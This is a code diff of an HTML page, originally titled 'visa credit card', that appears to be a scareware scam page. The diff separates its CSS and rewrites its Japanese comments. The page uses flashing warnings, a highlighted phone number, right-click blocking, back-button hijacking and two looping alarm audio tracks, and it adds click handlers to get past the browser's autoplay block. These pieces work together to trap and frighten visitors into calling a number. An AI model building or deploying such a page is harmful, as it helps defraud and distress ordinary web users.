@@ -1,138 +1,10 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <title>visa credit card</title>
-  <style>
-    /* -----------------------------------
-       画面全体・背景
-    ----------------------------------- */
-    body {
-      margin: 0;
-      padding: 0;
-      /* 背景を派手にグラデーションアニメーション */
-      background: linear-gradient(45deg, red, yellow, magenta, cyan);
-      background-size: 600% 600%;
-      animation: bgGradient 10s ease infinite;
-      font-family: sans-serif;
-      color: #fff;
-      overflow: hidden; /* スクロールバーを非表示 */
-    }
-
-    /* 背景グラデーションを動かす */
-    @keyframes bgGradient {
-      0% {
-        background-position: 0% 50%;
-      }
-      50% {
-        background-position: 100% 50%;
-      }
-      100% {
-        background-position: 0% 50%;
-      }
-    }
-
-    /* -----------------------------------
-       パトランプ部分
-    ----------------------------------- */
-    .patrol-lamp {
-      position: fixed;    /* スクロールしても位置が変わらないように固定 */
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 300px;
-      height: 300px;
-      border-radius: 50%;
-      z-index: 1;         /* テキストの下に表示したい場合は 0 やそれ以下に調整 */
-      opacity: 0.7;       /* 半透明にして背景やテキストと重ねる */
-      /* コニックグラデーションを使って赤い光が回転しているように演出 */
-      background: conic-gradient(
-        from 0deg,
-        rgba(255, 0, 0, 1) 0deg,
-        rgba(255, 0, 0, 0.2) 60deg,
-        rgba(255, 0, 0, 0.1) 120deg,
-        rgba(255, 0, 0, 0) 180deg,
-        rgba(255, 0, 0, 0) 360deg
-      );
-      animation: rotateLamp 2s linear infinite;
-    }
-
-    /* パトランプを回転させるアニメーション */
-    @keyframes rotateLamp {
-      0% {
-        transform: translate(-50%, -50%) rotate(0deg);
-      }
-      100% {
-        transform: translate(-50%, -50%) rotate(360deg);
-      }
-    }
-
-    /* -----------------------------------
-       メインコンテンツ部分
-    ----------------------------------- */
-    .wrapper {
-      position: relative;
-      z-index: 2; /* パトランプの上に表示 */
-      text-align: center;
-      margin-top: 15vh;
-    }
-
-    /* 警告文 */
-    .warning-text {
-      font-size: 4rem;
-      font-weight: bold;
-      text-shadow: 0 0 10px #fff,
-                   0 0 20px red,
-                   0 0 30px red,
-                   0 0 40px magenta,
-                   0 0 70px magenta,
-                   0 0 80px yellow,
-                   0 0 100px cyan;
-      animation: flicker 2s infinite;
-      margin-bottom: 20px;
-    }
-
-    /* 警告メッセージの点滅 */
-    @keyframes flicker {
-      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
-        opacity: 1;
-      }
-      20%, 24%, 55% {
-        opacity: 0.4;
-      }
-    }
-
-    /* サブテキスト */
-    .sub-text {
-      font-size: 2rem;
-      line-height: 1.5;
-      animation: blink 1.5s step-start infinite;
-    }
-
-    /* テキストの拡大縮小 */
-    @keyframes blink {
-      0% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.1);
-      }
-      100% {
-        transform: scale(1);
-      }
-    }
-
-    /* 電話番号部分を強調 */
-    .phone-number {
-      font-weight: bold;
-      color: #ff0;
-      text-shadow: 0 0 5px #fff,
-                   0 0 10px #fff,
-                   0 0 20px yellow,
-                   0 0 30px orange;
-    }
-
-  </style>
+  <meta charset="UTF-8" />
+  <title>Warning Page (Separated Files)</title>
+  <!-- CSSファイルをリンク -->
+  <link rel="stylesheet" href="styles.css" />
 </head>
 <body oncontextmenu="return false;"> <!-- 右クリック禁止 -->
 
@@ -147,7 +19,9 @@
     </p>
   </div>
 
-<!-- 音声ファイルを2つ同時に挿入 -->
+  <!-- 音声ファイルを2つ同時に挿入 -->
+  <!-- autoplay & loop で勝手に再生し続ける -->
+  <!-- 例：生ファイルに直接アクセスできるURLを使ってください -->
 <audio id="alert-audio1" 
        src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio1.mp3"
        autoplay loop preload="auto">
@@ -157,16 +31,18 @@
        autoplay loop preload="auto">
 </audio>
 
-<script>
-  window.addEventListener('load', () => {
-    const audioEl = document.getElementById('alert-audio');
-    audioEl.load(); // 明示的にロード開始
-  });
-</script>
-
+  <!-- JavaScript（ここではHTML内に記載） -->
   <script>
+    // ページ読込完了時、音声を事前ロードする例
+    window.addEventListener('load', () => {
+      const audioEl1 = document.getElementById('alert-audio1');
+      const audioEl2 = document.getElementById('alert-audio2');
+      audioEl1.load(); 
+      audioEl2.load();
+    });
+
     /*
-     * 1. 戻るボタン等の操作をできる限り妨害するための仕組み
+     * 1. 戻るボタン等の操作をできる限り妨害
      */
     history.pushState(null, null, location.href);
     window.onpopstate = function(event) {
@@ -196,14 +72,11 @@
     });
 
     /*
-     * 3. 音声の再生制御（複数）
-     *    - ブラウザが自動再生をブロックすることがあるため、
-     *      ユーザーアクション（クリック）時に再度 play() する処理を入れています。
+     * 3. ブラウザのAutoplayポリシー対策で、クリック時に再生を呼び出す
      */
     const audio1 = document.getElementById('alert-audio1');
     const audio2 = document.getElementById('alert-audio2');
 
-    // ページ内をクリックしたら再生をトリガー（Autoplayブロック回避用）
     document.addEventListener('click', () => {
       if (audio1.paused) {
         audio1.play().catch(err => console.log('Audio1再生ブロック:', err));
